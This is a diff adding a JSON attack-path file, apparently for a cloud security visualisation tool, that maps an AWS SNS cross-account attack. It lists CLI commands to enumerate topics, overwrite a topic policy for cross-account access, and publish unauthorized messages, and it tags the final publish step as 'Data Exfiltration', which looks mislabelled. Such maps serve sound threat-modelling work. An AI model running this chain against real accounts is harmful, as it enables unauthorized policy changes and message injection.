@@ -1,0 +1,59 @@
+{
+    "title": "Exploit SNS Cross-Account Permissions to Send Unauthorized Messages",
+    "icon": "https://img.icons8.com/?size=100&id=54386&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List SNS Topics",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "aws sns list-topics",
+                "description": "Lists all SNS topics in the specified AWS account.",
+                "services": ["SNS"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/sns/list-topics.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Get Topic Attributes",
+            "icon": "https://img.icons8.com/?size=100&id=7836&format=png&color=000000",
+            "details": {
+                "command": "aws sns get-topic-attributes --topic-arn <TopicArn>",
+                "description": "Gets the attributes of the specified SNS topic.",
+                "services": ["SNS"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/sns/get-topic-attributes.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Modify Topic Policy for Cross-Account Access",
+            "icon": "https://img.icons8.com/?size=100&id=10235&format=png&color=000000",
+            "details": {
+                "command": "aws sns set-topic-attributes --topic-arn <TopicArn> --attribute-name Policy --attribute-value file://<PathToPolicyDocument>",
+                "description": "Modifies the policy of the specified SNS topic to allow cross-account access.",
+                "services": ["SNS"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/sns/set-topic-attributes.html"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Publish Unauthorized Cross-Account Message",
+            "icon": "https://img.icons8.com/?size=100&id=10235&format=png&color=000000",
+            "details": {
+                "command": "aws sns publish --topic-arn <TopicArn> --message 'Unauthorized cross-account message'",
+                "description": "Publishes an unauthorized message to the SNS topic from another AWS account.",
+                "services": ["SNS"],
+                "attack_types": ["Data Exfiltration"]
+            }
+        }
+    ]
+}
